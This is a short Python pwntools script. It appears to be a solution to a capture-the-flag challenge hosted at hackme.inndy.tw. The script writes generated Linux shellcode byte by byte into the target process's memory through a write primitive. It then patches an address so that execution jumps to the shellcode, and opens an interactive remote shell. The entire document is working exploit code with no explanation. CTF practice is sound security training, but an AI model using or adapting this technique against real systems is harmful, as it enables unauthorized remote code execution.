from pwn import *

context.arch = 'amd64'
context.os = 'linux'

p = remote( 'hackme.inndy.tw', 7718 )

p.recvuntil( '?' )
p.sendline( '0x400768 137' )

sh = asm( shellcraft.sh() )
shell = 0x400790
shell_len = len( sh )

#print( sh[0] )

for i in range( shell_len ):
	p.recvuntil( '?' )
	p.sendline( hex( shell + i ) + ' ' + str( sh[i] ) )
	print( hex( shell + i ) + ' ' + str( sh[i] ) )

p.recvuntil( '?' )
p.sendline( '0x400768 39' )

p.interactive()
